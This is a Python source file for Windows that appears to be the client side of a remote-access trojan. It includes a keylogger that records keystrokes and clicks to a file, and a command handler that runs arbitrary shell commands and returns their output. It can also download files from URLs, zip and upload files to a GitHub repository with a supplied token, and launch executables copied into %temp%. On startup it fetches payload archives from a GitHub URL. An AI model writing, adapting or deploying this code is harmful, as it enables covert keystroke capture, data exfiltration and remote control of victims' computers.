import base64
import datetime
import subprocess
import os
import time
import shutil
import ctypes
from re import findall, MULTILINE
import autoit
from urllib.request import urlretrieve

from github import Github, InputGitTreeElement
import shlex

from pynput import keyboard, mouse
from ctypes import windll, WinDLL


def command(s, reply=False):
    p = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if reply:
        msg = p.stdout.read()
        return msg


def to_exe(s):  # Add .exe to string
    return (s + '.exe') if s[-4:] != '.exe' else s


def temp(p, folder):  # Create new path to file, but copy it to %temp% dir
    suffix = ''
    if os.path.isfile(p):
        suffix = os.path.split(p)[1]
        p = os.path.split(p)[0]
    new_path = os.path.join(os.environ['temp'], folder, os.path.split(p)[1])
    copytree_update(p, new_path)
    if suffix != '':
        new_path = os.path.join(new_path, suffix)
    time.sleep(1)
    return new_path


def get_disks():  # Return available disks on windows
    return findall(r'[A-Z]+:.*$', os.popen('mountvol /').read(), MULTILINE)


def copytree_update(src, dst, updateAll=False):  # Advanced version of copy function
    if updateAll:
        shutil.rmtree(dst)
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.exists(d):
            continue
        if os.path.isdir(s):
            shutil.copytree(s, d)
        else:
            if not os.path.exists(os.path.split(d)[0]):
                os.makedirs(os.path.split(d)[0])
            shutil.copy(s, d)


def set_wallpaper(p, iA=False):
    if iA:
        ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.abspath(p), 3)
    else:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(p), 3)


def sleep_cursor(time_secs):
    cursor[0] = autoit.mouse_get_pos()
    cursor[1] = time_secs


def write_notepad(text):
    command('notepad.exe')
    try:
        autoit.win_wait('[CLASS:Notepad]', timeout=3)
        autoit.win_activate('[CLASS:Notepad]')
    except autoit.autoit.AutoItError as e:
        print(e)
    for i in text.split('*'):
        autoit.send(i)
        autoit.send('{enter}')


def close_active_win():
    autoit.send('!{F4}')


def github_upload(token, repo, path):
    dt = datetime.datetime.now()
    s_time = f'{str(dt.time().hour).rjust(2, "0")}-' \
             f'{str(dt.time().minute).rjust(2, "0")}-' \
             f'{str(dt.time().second).rjust(2, "0")}'
    name = f'{dt.date()}_' \
           f'{s_time}_' \
           f'{os.path.split(path)[-1]}'
    zip_file = name + '.zip'
    if os.path.isdir(path):
        shutil.make_archive(name, 'zip', path)
    elif os.path.exists(path):
        if not os.path.isdir(name):
            os.mkdir(name)
        new_file = os.path.join(name, os.path.split(path)[-1])
        shutil.copy(path, new_file)
        shutil.make_archive(name, 'zip', name)
        os.remove(new_file)
        os.rmdir(name)
    else:
        raise FileNotFoundError(f'No such file or dir: {path}')

    g = Github(token)
    u = g.get_user()
    repo = u.get_repo(repo)
    master_ref = repo.get_git_ref('heads/master')
    master_sha = master_ref.object.sha
    base_tree = repo.get_git_tree(master_sha)

    data = base64.b64encode(open(zip_file, 'rb').read())
    blob = repo.create_git_blob(data.decode('utf-8'), "base64")
    element = InputGitTreeElement(path=zip_file, mode='100644',
                                  type='blob', sha=blob.sha)
    tree = repo.create_git_tree([element], base_tree)
    parent = repo.get_git_commit(master_sha)
    commit = repo.create_git_commit('#', tree, [parent])
    master_ref.edit(commit.sha)

    os.remove(zip_file)


class KeyLogger:
    debug = False

    def get_key_name(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char
        return str(key)

    def get_caps_state(self):
        hllDll = WinDLL("User32.dll")
        return hllDll.GetKeyState(0x14) & 0xffff != 0

    def get_layout(self):
        hwnd = self.user32.GetForegroundWindow()
        threadID = self.user32.GetWindowThreadProcessId(hwnd, None)
        CodeLang = self.user32.GetKeyboardLayout(threadID)
        if CodeLang == 0x4090409:
            return 'en'
        if CodeLang == 0x4190419:
            return 'ru'

    def on_press(self, key):
        layout = self.get_layout()
        if isinstance(key, keyboard.KeyCode):
            key_name = key.char
            d = '0123456789*+ -./'
            if not key_name and 96 <= key.vk <= 112:
                key_name = str(d[key.vk - 96])
            if key_name and len(key_name) == 1:
                if layout == 'en':
                    ...
                elif layout == 'ru':
                    if key_name in self._trans_table_en_to_ru:
                        key_name = self._trans_table_en_to_ru[key_name]
                else:
                    if self.debug:
                        raise ValueError('undetectable layout')
                if key_name.isprintable():
                    if self.get_caps_state():
                        if key_name.islower():
                            key_name = key_name.upper()
                        else:
                            key_name = key_name.lower()
                    self.current_line += key_name
        elif hasattr(key, 'name'):
            name = key.name
            if name == 'backspace':
                self.current_line = self.current_line[:-1]
            elif name == 'space':
                self.current_line += ' '
            elif name in self.ignore_keys:
                ...
            else:
                self.log_symbol(name)

    def on_click(self, x, y, button, pressed):
        if pressed and button == mouse.Button.left:
            self.log_symbol('click')

    def log_line(self, line):
        dt = datetime.datetime.now()
        prefix = f'{dt.date()}/{str(dt.hour).rjust(2, "0")}:' \
                 f'{str(dt.minute).rjust(2, "0")} -> '
        self.output += '\n' + prefix + line + '\n'
        self.check_temp_output()
        self.previous_log = line

    def log_symbol(self, s):
        if self.current_line:
            self.log_line(self.current_line)
            self.current_line = ''
        if s == self.previous_log:
            self.output += '[]'
        else:
            self.output += f'[{s}]'
        self.check_temp_output()
        self.previous_log = s

    def check_temp_output(self):
        if len(self.output) >= self.output_max_temp_symbols:
            if not self.debug:
                with open(self.filename, 'a') as f:
                    f.write(self.output)
            else:
                print(self.output, end='')
            self.output = ''

    def start(self, filename):
        self.user32 = windll.user32
        self._eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
        self._rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
        self._trans_table_en_to_ru = dict(zip(self._eng_chars, self._rus_chars))
        self.ignore_keys = {'shift', 'alt_l', 'alt_r', 'ctrl_l', 'ctrl_r'}
        self.current_line = ''
        self.previous_log = ''
        self.filename = filename
        with open(self.filename, 'a') as f:
            f.write('\n<---------->\n')
        self.output = ''
        self.output_max_temp_symbols = 100
        if self.debug:
            self.output_max_temp_symbols = 1

        key_listener = keyboard.Listener(on_press=self.on_press)
        key_listener.start()
        mouse_listener = mouse.Listener(on_click=self.on_click)
        mouse_listener.start()


def cmd(s: str, directory='', v=False):
    global current_path, infoA, cursor_down
    if v:
        return 8, 1

    # ?
    variables = {
        'script_dir': directory,
        'images': os.path.join(directory, 'images'),
        'executables': os.path.join(directory, 'executable'),
        'path': current_path,
        'keylog': os.path.join(directory, keylog_file),
    }
    for k, v in variables.items():
        s = s.replace(f'?{k}', v)
    cmd_name, *args = list(map(lambda x: x.strip('"').strip("'"),
                               shlex.split(s, posix=False)))
    if cmd_name == '.exe':
        if len(args) == 1:
            work = os.path.join(directory, 'executable')
            name = to_exe(args[0])
            folder = name[:-4]
            if os.path.exists(os.path.join(work, folder, name)):
                t = temp(os.path.join(work, folder, name), 'z1MSImc4eBoAd')
                command(t)
                return b''
            return 'Unknown exe'.encode('cp866')
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.cls':
        if args:
            name = to_exe(args[0])
            s = f'taskkill /f /im {name}'
            command(s)
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.download':
        if len(args) == 2:
            urlretrieve(args[1], args[0])
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.upload':
        if len(args) == 3:
            path, token, repo = args
            try:
                github_upload(token, repo, path)
            except Exception as e:
                return f'Error: {e}'.encode('cp866')
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.bg':
        if len(args) == 1:
            p = args[0]
            if p == 'A':
                infoA = not infoA
                return str(infoA).encode('cp866')
            ims = os.listdir(variables['im'])
            if p in map(lambda j: j if '.' not in j else j[:j.rfind('.')], ims):
                for i in ['.jpg', '.png', '.bmp']:
                    if p + i in ims:
                        p = p + i
                        break
            if os.path.exists(os.path.join(variables['im'], p)):
                set_wallpaper(os.path.join(variables['im'], p), infoA)
                return b''
            return 'No such im'.encode('cp866')
        else:
            return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.ls':
        if len(args) == 1:
            p = args[0]
            if p == 'root':
                current_path = ''
            elif p == '..' and current_path:
                current_path = os.path.split(current_path)[0]
            elif os.path.isdir(os.path.join(current_path, p)):
                current_path = os.path.join(current_path, p)
            else:
                return 'No such dir'.encode('cp866')
            return b''
        elif not args:
            if current_path == '':
                return '\n'.join(['\n'] + get_disks()).encode('cp866')
            return '\n'.join([current_path] + os.listdir(current_path)).encode('cp866')
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.curs':
        if len(args) == 1:
            t = args[0]
            sleep_cursor(float(t))
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.note':
        if len(args) == 2:
            time_sleep = float(args[0])
            time.sleep(time_sleep)
            t = args[1]
            write_notepad(t)
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.f4':
        if len(args) == 1:
            t = float(args[0])
            time.sleep(t)
            close_active_win()
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.write':
        if len(args) == 2:
            time_sleep = float(args[0])
            time.sleep(time_sleep)
            autoit.send(args[1])
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.movecurs':
        if len(args) == 2:
            time_sleep = float(args[0])
            time.sleep(time_sleep)
            for i in args[1:]:
                x, y = autoit.mouse_get_pos()
                i = i.split('.')
                autoit.mouse_move(x + int(i[0]), y + int(i[1]), speed=-1)
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.downcurs':
        if len(args) == 1:
            t = float(args[0])
            cursor_down[0], cursor_down[1] = t, time.time()
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.print':
        return ' '.join(args).encode('cp866')
    elif cmd_name == '.download_exe':
        if not args:
            download_folders(check=False)
            return b''
        return 'Wrong syntax'.encode('cp866')
    elif cmd_name == '.get_layout':
        if not args:
            return keylogger.get_layout().encode('cp866')
        return 'Wrong syntax'.encode('cp866')
    elif s[0] != '.':
        if s[0] == '?':
            msg = command(s[1:], True)
            return msg
        else:
            command(s)
            return b''
    return 'No such command'.encode('cp866')


def download_folders(check=True):
    check_folders = {'executable': load_exe,
                     'images': load_images}
    for k, v in check_folders.items():
        name, url = k, v
        print(f'check {name}')
        if not check or not os.path.exists(os.path.join(directory, name)):
            path = os.path.join(directory, f'{name}.zip')
            urlretrieve(load_prefix + url, path)
            shutil.unpack_archive(os.path.join(directory, f'{name}.zip'), directory, 'zip')
            os.remove(os.path.join(directory, f'{name}.zip'))


def init(directory_):
    global directory
    directory = directory_
    print('init')
    download_folders()
    keylogger.start(os.path.join(directory, keylog_file))


def track(directory):
    global check_init

    if cursor[1] > 0:
        if cursor[2] == 0:
            cursor[2] = time.time()
        length_ = 10
        if abs(cursor[0][0] - autoit.mouse_get_pos()[0]) > length_ or \
                abs(cursor[0][1] - autoit.mouse_get_pos()[1]) > length_:
            autoit.mouse_move(*cursor[0], speed=0)
        if time.time() - cursor[2] > cursor[1]:
            cursor[1] = 0
            cursor[2] = 0
    elif cursor_down[0]:
        autoit.mouse_up()
        autoit.mouse_down()
        if time.time() - cursor_down[1] > cursor_down[0]:
            cursor_down[0] = 0
    if check_init:
        init(directory)
        check_init = False

    delay = 0.1
    time.sleep(delay)


directory = None
infoA = False
cursor = [(0, 0), 0, 0]
cursor_down = [0, 0]
check_init = True
current_path = ''
keylog_file = 'keylog.txt'

load_prefix = 'https://raw.githubusercontent.com/'
load_exe = 'aantr/win-host/main/executable.zip'
load_images = 'aantr/win-host/main/images.zip'

keylogger = KeyLogger()
